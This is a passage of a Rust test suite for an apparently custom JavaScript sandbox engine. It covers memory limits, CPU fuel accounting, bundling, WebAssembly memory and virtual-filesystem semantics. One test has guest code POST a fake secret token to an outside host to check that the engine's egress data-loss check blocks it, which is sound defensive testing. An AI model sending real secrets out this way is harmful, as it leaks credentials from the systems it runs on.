        out["json"]["parsedFast"]["floats"],
        serde_json::json!([1.5, -0.25, 3.125])
    );
    assert_eq!(
        out["json"]["parsedFast"]["mixed"],
        serde_json::json!(["a", null, null, null, {"k": "v"}])
    );
    assert_eq!(
        out["json"]["parsedFast"]["customToJson"],
        "custom-to-json-ok"
    );
    assert!(out["json"]["parsedFast"].get("undef").is_none());
    assert!(out["json"]["parsedFast"].get("fnVal").is_none());
    assert_eq!(out["json"]["prettyHasNewline"], true);
    assert_eq!(out["json"]["cyclicThrew"], true);
    assert_eq!(out["json"]["perfDeltaValid"], true);
}

#[test]
fn test_issues_42_43_44_45_sandbox_memory_loop_fuel_egress_dlp_and_error_location() {
    // 1. Issue #42 & #45: Guest `Slice.evalSandbox` `{ memory }` alias, non-accumulating transient
    //    child heap across repeated calls, and non-duplicated `:1:` error location.
    let guest_script = r#"
const memResults = {};
for (const mem of [65536, 1048576, 16777216, 1073741824]) {
  const r = Slice.evalSandbox(
    'const a = new Array(1000000).fill(7); a.length',
    { memory: mem }
  );
  memResults[mem] = {
    ok: r.ok,
    returnValue: r.returnValue,
    violation: r.violation,
    memoryUsedBytes: r.memoryUsedBytes,
  };
}
const smallOk = Slice.evalSandbox('1 + 1', { memory: 65536 });
const errBoom = Slice.evalSandbox('throw new Error("boom")');
const errJson = Slice.evalSandbox('JSON.parse("{bad")');
console.log(JSON.stringify({ memResults, smallOk, errBoom, errJson }));
"#;
    let m = run_source_isolated(
        "issues-42-45-tenant",
        guest_script,
        CapabilityToken::pure_compute(),
        50_000_000,
        16 * 1024 * 1024,
    )
    .expect("issues 42 & 45 guest script execution");
    let parsed: serde_json::Value = serde_json::from_str(&m.stdout[0]).unwrap();

    // Issue #42 assertions
    assert_eq!(parsed["memResults"]["65536"]["ok"], false);
    assert!(
        parsed["memResults"]["65536"]["violation"]
            .as_str()
            .unwrap_or("")
            .contains("61440 bytes"),
        "expected 65536 (61440 net) ceiling violation, got: {}",
        parsed["memResults"]["65536"]
    );
    assert_eq!(parsed["memResults"]["1048576"]["ok"], false);
    assert!(
        parsed["memResults"]["1048576"]["violation"]
            .as_str()
            .unwrap_or("")
            .contains("1044480 bytes"),
        "expected 1048576 (1044480 net) ceiling violation, got: {}",
        parsed["memResults"]["1048576"]
    );
    assert_eq!(
        parsed["memResults"]["16777216"]["ok"], true,
        "16 MB child sandbox should succeed: {}",
        parsed["memResults"]["16777216"]
    );
    assert_eq!(parsed["memResults"]["16777216"]["returnValue"], "1000000");
    assert_eq!(
        parsed["memResults"]["1073741824"]["ok"], true,
        "1 GB requested (clamped to parent 16 MB) should succeed on 8 MB allocation: {}",
        parsed["memResults"]["1073741824"]
    );
    assert_eq!(parsed["memResults"]["1073741824"]["returnValue"], "1000000");
    assert_eq!(parsed["smallOk"]["ok"], true);
    assert_eq!(parsed["smallOk"]["returnValue"], "2");

    // Issue #45 assertions: no repeated location on `at <main>` and line is `:1:` (not `:2:`)
    let boom_err = parsed["errBoom"]["error"].as_str().unwrap_or("");
    assert!(
        boom_err.starts_with("Uncaught Error: boom"),
        "unexpected boom error: {}",
        boom_err
    );
    assert_eq!(
        boom_err.matches("(unknown at ").count(),
        1,
        "source location must not be duplicated in error string: {}",
        boom_err
    );
    assert!(
        boom_err.contains("unknown at :1:"),
        "single-line evalSandbox snippet should report line 1, got: {}",
        boom_err
    );
    let json_err = parsed["errJson"]["error"].as_str().unwrap_or("");
    assert!(
        json_err.starts_with("Uncaught SyntaxError:"),
        "unexpected JSON syntax error: {}",
        json_err
    );
    assert!(
        !json_err.contains(") ("),
        "JSON.parse error must not have trailing duplicate parenthetical location: {}",
        json_err
    );

    // 2. Issue #43: `while` and `do...while` loops report `fuel_used` proportional to iterations
    let mut host_iso = SliceIsolate::spawn(
        "issue-43-44-host",
        1,
        CapabilityToken::pure_compute().with_net_host("httpbin.org"),
        50_000_000,
        16 * 1024 * 1024,
    );
    let mut while_fuels = Vec::new();
    let mut do_while_fuels = Vec::new();
    for &n in &[1_000u64, 100_000, 1_000_000] {
        let w_out = host_iso.eval_sandbox(
            &format!("let i = 0; while (i < {n}) i++; i"),
            crate::SandboxEvalOptions::default(),
        );
        assert!(w_out.ok);
        while_fuels.push(w_out.fuel_used);

        let dw_out = host_iso.eval_sandbox(
            &format!("let i = 0; do {{ i++; }} while (i < {n}); i"),
            crate::SandboxEvalOptions::default(),
        );
        assert!(dw_out.ok);
        do_while_fuels.push(dw_out.fuel_used);
    }
    assert!(
        while_fuels[0] < while_fuels[1] && while_fuels[1] < while_fuels[2],
        "while loop fuelUsed must scale monotonically with iteration count: {:?}",
        while_fuels
    );
    assert!(
        do_while_fuels[0] < do_while_fuels[1] && do_while_fuels[1] < do_while_fuels[2],
        "do...while loop fuelUsed must scale monotonically with iteration count: {:?}",
        do_while_fuels
    );
    assert!(
        while_fuels[2] >= 4_000 && do_while_fuels[2] >= 4_000,
        "1M iterations should consume >= 4,000 fuel (got while={}, do_while={})",
        while_fuels[2],
        do_while_fuels[2]
    );

    let trapped_while = host_iso.eval_sandbox(
        "let i = 0; while (i < 500000) i++; i",
        crate::SandboxEvalOptions {
            fuel: Some(100_000),
            ..Default::default()
        },
    );
    assert!(!trapped_while.ok);
    assert!(
        trapped_while
            .violation
            .as_deref()
            .unwrap_or("")
            .contains("exceeded deterministic CPU instruction fuel limit (100000 ops)"),
        "unexpected trapped_while violation: {:?}",
        trapped_while.violation
    );

    let ok_while = host_iso.eval_sandbox(
        "let i = 0; while (i < 500000) i++; i",
        crate::SandboxEvalOptions {
            fuel: Some(10_000_000),
            ..Default::default()
        },
    );
    assert!(ok_while.ok);
    assert_eq!(ok_while.fuel_used, 500_010);

    // Issue #43 follow-up: `reported fuelUsed == smallest budget that completes` across `for`, `while`, `do-while`
    // 1. Exact 1,000,000-iteration parity check (`4005` for `for`, `1000010` for `while` and `do-while`)
    for (name, src, expected_fuel) in [
        (
            "for-1m",
            "let s = 0; for (let i = 0; i < 1000000; i++) s += i; s",
            4_005u64,
        ),
        (
            "while-1m",
            "let i = 0, s = 0; while (i < 1000000) { s += i; i++; } s",
            1_000_010u64,
        ),
        (
            "do-while-1m",
            "let i = 0, s = 0; do { s += i; i++; } while (i < 1000000); s",
            1_000_010u64,
        ),
    ] {
        let reported = host_iso
            .eval_sandbox(
                src,
                crate::SandboxEvalOptions {
                    fuel: Some(10_000_000),
                    ..Default::default()
                },
            )
            .fuel_used;
        assert_eq!(
            reported, expected_fuel,
            "{name}: unexpected reported fuelUsed"
        );
        let below = host_iso.eval_sandbox(
            src,
            crate::SandboxEvalOptions {
                fuel: Some(reported - 1),
                ..Default::default()
            },
        );
        assert!(
            !below.ok,
            "{name}: budget {}-1 must trap with CpuFuelExhausted",
            reported
        );
        let exact = host_iso.eval_sandbox(
            src,
            crate::SandboxEvalOptions {
                fuel: Some(reported),
                ..Default::default()
            },
        );
        assert!(
            exact.ok && exact.fuel_used == reported,
            "{name}: exact budget {reported} must complete with fuel_used == {reported}"
        );
    }

    // 2. Full binary-search parity check across `for`, `while`, `do-while`
    for (name, src, expected_fuel) in [
        (
            "for",
            "let s = 0; for (let i = 0; i < 100000; i++) s += i; s",
            405u64,
        ),
        (
            "while",
            "let i = 0, s = 0; while (i < 100000) { s += i; i++; } s",
            100_010u64,
        ),
        (
            "do-while",
            "let i = 0, s = 0; do { s += i; i++; } while (i < 100000); s",
            100_010u64,
        ),
    ] {
        let reported = host_iso
            .eval_sandbox(
                src,
                crate::SandboxEvalOptions {
                    fuel: Some(10_000_000),
                    ..Default::default()
                },
            )
            .fuel_used;
        assert_eq!(
            reported, expected_fuel,
            "{name}: unexpected reported fuelUsed"
        );

        let mut lo = 1u64;
        let mut hi = 2_000_000u64;
        while lo < hi {
            let mid = (lo + hi) / 2;
            let r = host_iso.eval_sandbox(
                src,
                crate::SandboxEvalOptions {
                    fuel: Some(mid),
                    ..Default::default()
                },
            );
            if r.ok {
                hi = mid;
            } else {
                lo = mid + 1;
            }
        }
        assert_eq!(
            reported, lo,
            "{name}: reported fuelUsed ({reported}) must equal smallest budget that completes ({lo})"
        );
    }

    // 3. Issue #44: Egress DLP block uses dedicated `EgressSecretLeakBlocked` message, not env var message
    let dlp_out = host_iso.eval_sandbox(
        r#"Slice.fetchSync("https://httpbin.org/post", { method: "POST", body: "leak=sk-secret-xyz" })"#,
        crate::SandboxEvalOptions {
            allow_net: vec!["httpbin.org".to_string()],
            audit_secret: Some("sk-secret-xyz".to_string()),
            ..Default::default()
        },
    );
    assert!(!dlp_out.ok);
    let dlp_violation = dlp_out.violation.as_deref().unwrap_or("");
    assert!(
        dlp_violation.starts_with("Egress DLP Violation (EGRESS_SECRET_LEAK_BLOCKED):"),
        "expected Egress DLP Violation prefix, got: {}",
        dlp_violation
    );
    assert!(
        !dlp_violation.contains("lacks environment variable authority"),
        "must not report Egress DLP violation as an environment variable error: {}",
        dlp_violation
    );
}

#[test]
fn test_bundled_runtime_execution_circular_entry_live_reexports_crypto_alias_and_jsx_override() {
    let test_dir = std::env::temp_dir().join(format!(
        "slice_engine_bundled_exec_{}_{}",
        std::process::id(),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos()
    ));
    let _ = std::fs::remove_dir_all(&test_dir);
    std::fs::create_dir_all(&test_dir).expect("mkdir test_dir");

    // 1. Single-file TypeScript execution
    let single_ts = test_dir.join("single.ts");
    std::fs::write(
        &single_ts,
        "interface Cfg { scale: number }\nconst cfg: Cfg = { scale: 7 };\nconsole.log(cfg.scale * 6);\n",
    )
    .unwrap();
    let bundled_single = slice_cas::bundle_entrypoint_with_deps(&single_ts).unwrap();
    let m_single = run_source_isolated(
        "single-ts-exec",
        &bundled_single,
        CapabilityToken::pure_compute(),
        2_000_000,
        16 * 1024 * 1024,
    )
    .unwrap();
    assert_eq!(m_single.stdout, vec!["42"]);

    // 2. Circular entrypoint + hoisted function export + live export * mutable binding + aliased node:crypto
    let circ_dir = test_dir.join("circ");
    std::fs::create_dir_all(&circ_dir).unwrap();
    std::fs::write(
        circ_dir.join("state.ts"),
        "export let counter = 10;\nexport function bump(delta: number) { counter += delta; }\n",
    )
    .unwrap();
    std::fs::write(circ_dir.join("barrel.ts"), "export * from './state';\n").unwrap();
    std::fs::write(
        circ_dir.join("helper.ts"),
        "import { entryTag } from './entry';\nimport { createHash as hash } from 'node:crypto';\nexport function describeEntry(): string { return 'seen:' + entryTag() + ':' + hash('sha256').update('ok').digest('hex').slice(0, 6); }\n",
    )
    .unwrap();
    let circ_entry = circ_dir.join("entry.ts");
    std::fs::write(
        &circ_entry,
        "import { describeEntry } from './helper';\nimport { counter, bump } from './barrel';\nexport function entryTag(): string { return 'root'; }\nbump(5);\nconsole.log(describeEntry() + ':' + counter);\n",
    )
    .unwrap();
    let bundled_circ = slice_cas::bundle_entrypoint_with_deps(&circ_entry).unwrap();
    let m_circ = run_source_isolated(
        "circ-entry-exec",
        &bundled_circ,
        CapabilityToken::pure_compute(),
        5_000_000,
        16 * 1024 * 1024,
    )
    .unwrap();
    assert_eq!(m_circ.stdout, vec!["seen:root:268936:15"]);

    // 3. Installed JSX runtime override + slice:jsx/jsx-runtime direct import
    let jsx_dir = test_dir.join("jsx_app");
    let custom_react_dir = jsx_dir.join("node_modules/react");
    std::fs::create_dir_all(&custom_react_dir).unwrap();
    std::fs::write(
        custom_react_dir.join("package.json"),
        r#"{"name":"react","version":"19.0.0","exports":{"./jsx-runtime":"./jsx-runtime.js"}}"#,
    )
    .unwrap();
    std::fs::write(
        custom_react_dir.join("jsx-runtime.js"),
        "exports.jsx = function(tag, props) { return 'custom-react:' + tag + ':' + (props && props.id || ''); };\n",
    )
    .unwrap();
    let jsx_entry = jsx_dir.join("app.js");
    std::fs::write(
        &jsx_entry,
        "const customJsx = require('react/jsx-runtime');\nconst builtinJsx = require('slice:jsx/jsx-runtime');\nconsole.log(customJsx.jsx('div', { id: 'ok' }) + '|' + typeof builtinJsx.jsx);\n",
    )
    .unwrap();
    let bundled_jsx = slice_cas::bundle_entrypoint_with_deps(&jsx_entry).unwrap();
    let m_jsx = run_source_isolated(
        "jsx-override-exec",
        &bundled_jsx,
        CapabilityToken::pure_compute(),
        2_000_000,
        16 * 1024 * 1024,
    )
    .unwrap();
    assert_eq!(m_jsx.stdout, vec!["custom-react:div:ok|function"]);

    let _ = std::fs::remove_dir_all(&test_dir);
}

#[test]
fn test_wasm_lazy_memory_buffer_materialization_and_sync() {
    let script = r#"
        const sec = (id, body) => [id, body.length, ...body];
        const str = (s) => [s.length, ...Array.from(s, (c) => c.charCodeAt(0))];
        const body = (bytes) => [bytes.length, ...bytes];

        // Module with 1 memory page, NO imports, and 2 exports: memory + write_and_add(offset, val)
        const wasmBytes = new Uint8Array([
            0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00,
            // Type 0: (i32, i32) -> i32
            ...sec(0x01, [0x01, 0x60, 0x02, 0x7F, 0x7F, 0x01, 0x7F]),
            // Function 0 -> Type 0
            ...sec(0x03, [0x01, 0x00]),
            // Memory: min=1, max=3
            ...sec(0x05, [0x01, 0x01, 0x01, 0x03]),
            // Exports: memory (mem 0), write_and_add (func 0)
            ...sec(0x07, [
                0x02,
                ...str("memory"), 0x02, 0x00,
                ...str("write_and_add"), 0x00, 0x00
            ]),
            // Code: mem[offset] = mem[offset] + val; return mem[offset];
            ...sec(0x0A, [
                0x01,
                ...body([
                    0x00,
                    0x20, 0x00,
                    0x20, 0x00, 0x28, 0x02, 0x00,
                    0x20, 0x01, 0x6A,
                    0x36, 0x02, 0x00,
                    0x20, 0x00, 0x28, 0x02, 0x00,
                    0x0B
                ])
            ])
        ]);

        const inst = new WebAssembly.Instance(new WebAssembly.Module(wasmBytes));
        // Execute multiple Wasm calls BEFORE ever accessing exports.memory.buffer
        const r1 = inst.exports.write_and_add(32, 77);
        const r2 = inst.exports.write_and_add(32, 23);

        // Now materialize exports.memory.buffer lazily and verify Wasm-written word is intact
        const view = new Int32Array(inst.exports.memory.buffer);
        const lazyRead = view[8]; // byte offset 32

        // Mutate from JS, call Wasm again, and grow memory
        view[8] = 500;
        const r3 = inst.exports.write_and_add(32, 25);
        const oldPages = inst.exports.memory.grow(1);
        const grownView = new Int32Array(inst.exports.memory.buffer);

        console.log([r1, r2, lazyRead, r3, oldPages, grownView.byteLength, grownView[8]].join(":"));
    "#;

    let metrics = run_source_isolated(
        "wasm-lazy-mem",
        script,
        CapabilityToken::pure_compute(),
        5_000_000,
        16 * 1024 * 1024,
    )
    .unwrap();
    assert_eq!(metrics.stdout, vec!["77:100:100:525:1:131072:525"]);
}

#[test]
fn test_wave3_issues_108_109_110_111_inode_vfs_fd_table_and_cwd_anchoring() {
    use slice_sandbox::cached_normalized_cwd;

    let host_dir =
        std::env::temp_dir().join(format!("slice_wave3_host_vfs_{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&host_dir);
    std::fs::create_dir_all(host_dir.join("existing_host_dir")).unwrap();
    let host_source = host_dir.join("host-source.txt");
    std::fs::write(&host_source, b"host-payload").unwrap();
    let host_dir_norm = host_dir.to_string_lossy().replace('\\', "/");
    let host_source_norm = host_source.to_string_lossy().replace('\\', "/");

    let cwd_norm = cached_normalized_cwd();
    let rel_subdir = format!("{}/target/wave3_rel_vfs_{}", cwd_norm, std::process::id());
    let rel_local = format!("target/wave3_rel_vfs_{}", std::process::id());

    let script = format!(
        r##"
import fs from "node:fs";
import path from "node:path";
import {{ Worker }} from "node:worker_threads";

async function runWave3VfsSuite() {{
  const root = "/tmp/wave3_vfs";
  fs.mkdirSync(root, {{ recursive: true }});

  // ---------------------------------------------------------------------------
  // 1. Issue #108: Magic-prefix binary files are NEVER confused with symlinks,
  //    lstatSync reports exact symlink target byte length, and Worker inherits
  //    typed VfsEntryKind entries cleanly.
  // ---------------------------------------------------------------------------
  const magicTarget = root + "/real_target.txt";
  fs.writeFileSync(magicTarget, "REAL_TARGET_BODY_99");
  const magicPayload = Buffer.concat([
    Buffer.from("\x00__SLICE_SYMLINK__:" + magicTarget),
    Buffer.from([0x00, 0xde, 0xad, 0xbe, 0xef]),
  ]);

  const binWrite = root + "/magic_write.bin";
  fs.writeFileSync(binWrite, magicPayload);
  const binAppend = root + "/magic_append.bin";
  fs.appendFileSync(binAppend, magicPayload.subarray(0, 10));
  fs.appendFileSync(binAppend, magicPayload.subarray(10));
  const binCopy = root + "/magic_copy.bin";
  fs.copyFileSync(binWrite, binCopy);
  const binRename = root + "/magic_renamed.bin";
  fs.renameSync(binCopy, binRename);

  for (const p of [binWrite, binAppend, binRename]) {{
    const ls = fs.lstatSync(p);
    const st = fs.statSync(p);
    if (ls.isSymbolicLink() || !ls.isFile() || !st.isFile()) {{
      throw new Error("#108 magic-prefixed regular file misclassified: " + p);
    }}
    const readBack = fs.readFileSync(p);
    if (Buffer.compare(readBack, magicPayload) !== 0) {{
      throw new Error("#108 magic-prefixed payload corrupted: " + p);
    }}
    let readlinkCode = "";
    try {{ fs.readlinkSync(p); }} catch (e) {{ readlinkCode = e.code; }}
    if (readlinkCode !== "EINVAL") {{
      throw new Error("#108 expected EINVAL on readlinkSync(regular), got: " + readlinkCode);
    }}
  }}

  const realSym = root + "/actual_link.txt";
  fs.symlinkSync(magicTarget, realSym);
  const symLstat = fs.lstatSync(realSym);
  const symStat = fs.statSync(realSym);
  if (!symLstat.isSymbolicLink() || symLstat.isFile()) {{
    throw new Error("#108 real symlink lstatSync failed");
  }}
  if (symLstat.size !== Buffer.byteLength(magicTarget)) {{
    throw new Error("#108 lstatSync.size mismatch: " + symLstat.size);
  }}
  if (symStat.size !== 19 || fs.readFileSync(realSym, "utf8") !== "REAL_TARGET_BODY_99") {{
    throw new Error("#108 statSync/readFileSync through real symlink failed");
  }}

  // Verify Worker VFS snapshot preserves typed file vs symlink entries
  const workerScript = root + "/worker_check.js";
  fs.writeFileSync(
    workerScript,
    `const fs = require("node:fs");
     const {{ parentPort }} = require("node:worker_threads");
     const lsBin = fs.lstatSync({bin_write_lit});
     const lsSym = fs.lstatSync({real_sym_lit});
     parentPort.postMessage({{
       binIsSym: lsBin.isSymbolicLink(),
       binLen: fs.readFileSync({bin_write_lit}).length,
       symIsSym: lsSym.isSymbolicLink(),
       symBody: fs.readFileSync({real_sym_lit}, "utf8"),
     }});`
  );
  const workerMsg = await new Promise((resolve, reject) => {{
    const w = new Worker(workerScript);
    w.on("message", resolve);
    w.on("error", reject);
  }});
  if (
    workerMsg.binIsSym !== false ||
    workerMsg.binLen !== magicPayload.length ||
    workerMsg.symIsSym !== true ||
    workerMsg.symBody !== "REAL_TARGET_BODY_99"
  ) {{
    throw new Error("#108 worker VFS snapshot mismatch: " + JSON.stringify(workerMsg));
  }}

  // ---------------------------------------------------------------------------
  // 2. Issue #109: Unified POSIX preconditions across VFS and host entries
  // ---------------------------------------------------------------------------
  const hostSource = {host_src_lit};
  const hostExistingDir = {host_dir_lit} + "/existing_host_dir";
  const destDir = root + "/dest_dir";
  fs.mkdirSync(destDir, {{ recursive: true }});
  fs.writeFileSync(destDir + "/child", "keep");

  const expectCode = (fn, expected) => {{
    let got = "NO_THROW";
    try {{ fn(); }} catch (e) {{ got = e && e.code ? e.code : String(e); }}
    if (got !== expected) {{
      throw new Error("#109 expected " + expected + ", got " + got);
    }}
  }};

  // Exact #109 repro: host regular file renamed onto VFS directory
  expectCode(() => fs.renameSync(hostSource, destDir), "EISDIR");
  if (!fs.statSync(destDir).isDirectory()) throw new Error("#109 destDir lost directory status");
  if (fs.readdirSync(destDir).join(",") !== "child") throw new Error("#109 destDir children corrupted");
  if (fs.readFileSync(destDir + "/child", "utf8") !== "keep") throw new Error("#109 child corrupted");
  if (fs.readFileSync(hostSource, "utf8") !== "host-payload") throw new Error("#109 hostSource lost");

  // Sibling #109 preconditions across VFS & host
  const vfsFile = root + "/regular.txt";
  fs.writeFileSync(vfsFile, "abc");
  expectCode(() => fs.renameSync(vfsFile, destDir), "EISDIR");
  expectCode(() => fs.renameSync(vfsFile, hostExistingDir), "EISDIR");
  expectCode(() => fs.renameSync(destDir, vfsFile), "ENOTDIR");
  expectCode(() => fs.renameSync(destDir, hostSource), "ENOTDIR");

  const otherNonEmpty = root + "/non_empty_target";
  fs.mkdirSync(otherNonEmpty, {{ recursive: true }});
  fs.writeFileSync(otherNonEmpty + "/item", "1");
  expectCode(() => fs.renameSync(destDir, otherNonEmpty), "ENOTEMPTY");
  expectCode(() => fs.renameSync(destDir, destDir + "/sub"), "EINVAL");

  const emptyTarget = root + "/empty_target";
  fs.mkdirSync(emptyTarget, {{ recursive: true }});
  const movableDir = root + "/movable_dir";
  fs.mkdirSync(movableDir, {{ recursive: true }});
  fs.writeFileSync(movableDir + "/moved.txt", "ok-moved");
  fs.renameSync(movableDir, emptyTarget);
  if (fs.existsSync(movableDir) || fs.readFileSync(emptyTarget + "/moved.txt", "utf8") !== "ok-moved") {{
    throw new Error("#109 dir -> emptyDir rename failed");
  }}

  expectCode(() => fs.writeFileSync(destDir, "x"), "EISDIR");
  expectCode(() => fs.appendFileSync(destDir, "x"), "EISDIR");
  expectCode(() => fs.copyFileSync(vfsFile, destDir), "EISDIR");
  expectCode(() => fs.truncateSync(destDir, 0), "EISDIR");
  expectCode(() => fs.symlinkSync(vfsFile, vfsFile), "EEXIST");
  expectCode(() => fs.symlinkSync(vfsFile, destDir), "EEXIST");

  // ---------------------------------------------------------------------------
  // 3. Issue #110: Canonical CWD anchoring across realpathSync, relative VFS
  //    paths, process.cwd(), and path.resolve()
  // ---------------------------------------------------------------------------
  const relDir = {rel_local_lit};
  const relFile = relDir + "/rel.txt";
  fs.mkdirSync(relDir, {{ recursive: true }});
  fs.writeFileSync(relFile, "payload-110");
  const absResolved = fs.realpathSync(relFile);
  const pathResolved = path.resolve(relFile);
  if (absResolved !== pathResolved) {{
    throw new Error("#110 realpathSync vs path.resolve mismatch: " + absResolved + " !== " + pathResolved);
  }}
  if (!fs.existsSync(absResolved) || fs.readFileSync(absResolved, "utf8") !== "payload-110") {{
    throw new Error("#110 readFileSync(realpathSync(rel)) failed");
  }}
  fs.unlinkSync(absResolved);
  if (fs.existsSync(relFile) || fs.existsSync(absResolved)) {{
    throw new Error("#110 unlinkSync(abs) did not remove relative VFS entry");
  }}

  // ---------------------------------------------------------------------------
  // 4. Issue #111: Rust inode-backed open FD table across renameSync, path
  //    replacement, and unlinkSync while open
  // ---------------------------------------------------------------------------
  const fdA = root + "/fd_a.txt";
  const fdB = root + "/fd_b.txt";
  fs.writeFileSync(fdA, "payload");
  const fd1 = fs.openSync(fdA, "r");
  fs.renameSync(fdA, fdB);
  const rbuf1 = Buffer.alloc(7);
  const n1 = fs.readSync(fd1, rbuf1, 0, 7, 0);
  // Write a brand-new file at old path fdA while fd1 is still open!
  fs.writeFileSync(fdA, "REPLACE");
  const rbuf2 = Buffer.alloc(7);
  const n2 = fs.readSync(fd1, rbuf2, 0, 7, 0);
  fs.closeSync(fd1);

  // Atomic rename replacement over open file path
  const fdAtomic = root + "/fd_atomic.txt";
  const fdTmp = root + "/fd_atomic.tmp";
  fs.writeFileSync(fdAtomic, "OLD_INO");
  const fdOpenOld = fs.openSync(fdAtomic, "r");
  fs.writeFileSync(fdTmp, "NEW_INO");
  fs.renameSync(fdTmp, fdAtomic);
  const oldBuf = Buffer.alloc(7);
  fs.readSync(fdOpenOld, oldBuf, 0, 7, 0);
  fs.closeSync(fdOpenOld);
  const newPathBody = fs.readFileSync(fdAtomic, "utf8");

  // Unlink while FD remains open: read/write/fstat/ftruncate continue until closeSync
  const fdUnlinkedPath = root + "/fd_unlinked.txt";
  const fdUnlinked = fs.openSync(fdUnlinkedPath, "w+");
  fs.writeSync(fdUnlinked, Buffer.from("ephemeral-inode"), 0, 15, 0);
  fs.unlinkSync(fdUnlinkedPath);
  const existsWhileOpen = fs.existsSync(fdUnlinkedPath);
  const sizeBeforeTrunc = fs.fstatSync(fdUnlinked).size;
  const ubuf = Buffer.alloc(15);
  fs.readSync(fdUnlinked, ubuf, 0, 15, 0);
  fs.ftruncateSync(fdUnlinked, 9);
  const sizeAfterTrunc = fs.fstatSync(fdUnlinked).size;
  fs.closeSync(fdUnlinked);
  let closedErr = "";
  try {{ fs.fstatSync(fdUnlinked); }} catch (e) {{ closedErr = e.code; }}

  console.log(JSON.stringify({{
    ok108: true,
    ok109: true,
    ok110: process.cwd() === {cwd_lit},
    fdRenameRead: n1 === 7 ? rbuf1.toString("utf8") : "bad",
    fdReplacementRead: n2 === 7 ? rbuf2.toString("utf8") : "bad",
    fdAtomicOld: oldBuf.toString("utf8"),
    fdAtomicNew: newPathBody,
    unlinked: {{
      existsWhileOpen,
      sizeBeforeTrunc,
      readBody: ubuf.toString("utf8"),
      sizeAfterTrunc,
      closedErr,
    }},
  }}));
}}

runWave3VfsSuite().catch((e) => console.log(JSON.stringify({{ __err: String(e && e.stack || e) }})));
"##,
        bin_write_lit = serde_json::to_string("/tmp/wave3_vfs/magic_write.bin").unwrap(),
        real_sym_lit = serde_json::to_string("/tmp/wave3_vfs/actual_link.txt").unwrap(),
        host_src_lit = serde_json::to_string(&host_source_norm).unwrap(),
        host_dir_lit = serde_json::to_string(&host_dir_norm).unwrap(),
        rel_local_lit = serde_json::to_string(&rel_local).unwrap(),
        cwd_lit = serde_json::to_string(cwd_norm).unwrap(),
    );

    let test_dir =
        std::env::temp_dir().join(format!("slice_wave3_vfs_bundle_{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&test_dir);
    std::fs::create_dir_all(&test_dir).unwrap();
    let entry_path = test_dir.join("index.mjs");
    std::fs::write(&entry_path, &script).unwrap();
    let bundled = slice_cas::bundle_entrypoint_with_deps(&entry_path).unwrap();
    let _ = std::fs::remove_dir_all(&test_dir);

    let caps = CapabilityToken::pure_compute()
        .with_read_prefix("/tmp/wave3_vfs")
        .with_write_prefix("/tmp/wave3_vfs")
        .with_read_prefix(&host_dir_norm)
        .with_write_prefix(&host_dir_norm)
        .with_read_prefix(&rel_subdir)
        .with_write_prefix(&rel_subdir);

    let m = run_source_isolated(
        "wave3-vfs-suite",
        &bundled,
        caps,
        5_000_000,
        16 * 1024 * 1024,
    )
    .expect("wave3 vfs execution");
    let _ = std::fs::remove_dir_all(&host_dir);

    let out: serde_json::Value =
        serde_json::from_str(m.stdout.first().expect("stdout line")).expect("json output");
    assert!(out.get("__err").is_none(), "wave3 vfs error: {}", out);
    assert_eq!(out["ok108"], true);
    assert_eq!(out["ok109"], true);
    assert_eq!(out["ok110"], true);
    assert_eq!(out["fdRenameRead"], "payload");
    assert_eq!(out["fdReplacementRead"], "payload");
    assert_eq!(out["fdAtomicOld"], "OLD_INO");
    assert_eq!(out["fdAtomicNew"], "NEW_INO");
    assert_eq!(out["unlinked"]["existsWhileOpen"], false);
    assert_eq!(out["unlinked"]["sizeBeforeTrunc"], 15);
    assert_eq!(out["unlinked"]["readBody"], "ephemeral-inode");
    assert_eq!(out["unlinked"]["sizeAfterTrunc"], 9);
    assert_eq!(out["unlinked"]["closedErr"], "EBADF");

    // Also verify zero-disclosure `process.cwd()` in pure_compute() sandboxes
    let pure_m = run_source_isolated(
        "wave3-pure-cwd",
        "console.log(process.cwd());",
        CapabilityToken::pure_compute(),
        500_000,
        4 * 1024 * 1024,
    )
    .unwrap();
    assert_eq!(pure_m.stdout, vec!["/workspace"]);
}

#[test]
fn test_wave5_issues_122_123_124_125_wasm_shared_store_memory_globals_tables_and_i64() {
    let script = r#"
        const sec = (id, body) => [id, body.length, ...body];
        const str = (s) => [s.length, ...Array.from(s, (c) => c.charCodeAt(0))];
        const fnBody = (bytes) => [bytes.length, ...bytes];
        function errName(fn) {
            try { fn(); return "OK"; }
            catch (e) { return e && e.name ? e.name : typeof e; }
        }

        // =====================================================================
        // 1. Issue #122: Native Wasm & JS memory.grow buffer refresh & detach
        // =====================================================================
        const memTrapBytes = new Uint8Array([
            0, 97, 115, 109, 1, 0, 0, 0,
            1, 13, 3, 96, 0, 1, 127, 96, 1, 127, 1, 127, 96, 0, 0,
            3, 5, 4, 1, 0, 2, 0,
            5, 4, 1, 1, 1, 3,
            7, 43, 5,
              6, 109, 101, 109, 111, 114, 121, 2, 0,
              4, 103, 114, 111, 119, 0, 0,
              4, 115, 105, 122, 101, 0, 1,
              9, 119, 114, 105, 116, 101, 84, 114, 97, 112, 0, 2,
              4, 108, 111, 97, 100, 0, 3,
            10, 32, 4,
              6, 0, 32, 0, 64, 0, 11,
              4, 0, 63, 0, 11,
              10, 0, 65, 0, 65, 42, 58, 0, 0, 0, 11,
              7, 0, 65, 0, 45, 0, 0, 11
        ]);
        const memMod = new WebAssembly.Module(memTrapBytes);
        const inst122 = new WebAssembly.Instance(memMod);
        const memory = inst122.exports.memory;
        const oldBuffer = memory.buffer;
        new Uint8Array(oldBuffer)[0] = 7;
        const previousPages = inst122.exports.grow(1);
        const wasmPages = inst122.exports.size();
        const currentBuffer = memory.buffer;
        const currentBytes = currentBuffer.byteLength;
        const retainedByte = new Uint8Array(currentBuffer)[0];
        // Write into newly grown page 2 from JS and ensure no bounds failure
        new Uint8Array(currentBuffer)[65536] = 91;

        // Failed native growth beyond declared maximum (3 pages) must return -1 and NOT detach
        const failedGrow = inst122.exports.grow(10);
        const afterFailBuffer = memory.buffer;
        const failKeptBuffer = afterFailBuffer === currentBuffer && !currentBuffer.detached;

        // Follow-up JS memory.grow(1) (2 -> 3 pages) + JS memory.grow(0) detachment
        const jsPrevPages = memory.grow(1);
        const currentDetachedAfterJsGrow = currentBuffer.detached === true;
        const afterJsGrowBuf = memory.buffer;
        new Uint8Array(afterJsGrowBuf)[131072] = 53;
